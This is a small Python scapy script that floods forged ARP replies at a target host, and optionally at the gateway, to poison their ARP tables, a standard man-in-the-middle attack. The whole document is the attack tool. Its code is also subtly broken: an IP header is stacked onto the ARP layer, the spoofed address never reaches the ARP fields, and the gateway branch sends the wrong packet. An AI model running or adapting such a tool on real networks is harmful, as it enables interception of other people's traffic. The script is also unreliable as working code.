import argparse
from scapy.all import *

args = None


def parse_command():
    """

    :return: Parse of the arguments
    """
    ap = argparse.ArgumentParser(description="Spoof ARP tables")
    ap.add_argument('-i', '--iface', help='Interface you wish to use')
    ap.add_argument('-s', '--src', help='The address you want for the attacker')
    ap.add_argument('-d', '--delay', type=float, default=0, help='Delay (in seconds) between messages')
    ap.add_argument('-gw', action='store_true', default=False, help='should GW be attacked as well')
    ap.add_argument('-t', '--target', required=True, help='IP of target')
    return ap.parse_args()


def main():
    gateway_address = None  # We will only use this in the case that the gateway is to be attacked
    src_address = None  # src_address for the ARP response. Defined here so it can be assigned to within a condition
    if args.src is None:  # If no src argument was supplied
        src_address = IP().src  # Get the devices IP address
    else:
        src_address = args.src  # Get the IP address supplied as command-line argument
    if args.gw:
        gtwy = sr1(IP(dst='8.8.8.8', ttl=1))
        gateway_address = gtwy.src
    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2)/IP(src=src_address, dst=args.target)
    gtwy_pkt = None
    if args.gw:
        gtwy_pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2)/IP(src=src_address, dst=gateway_address)
    pkt.show()
    while True:
        sendp(pkt, iface=args.iface)
        if args.gw:
            sendp(gtwy, iface=args.iface)
        time.sleep(args.delay)


if __name__ == '__main__':
    args = parse_command()
    print(args)
    main()
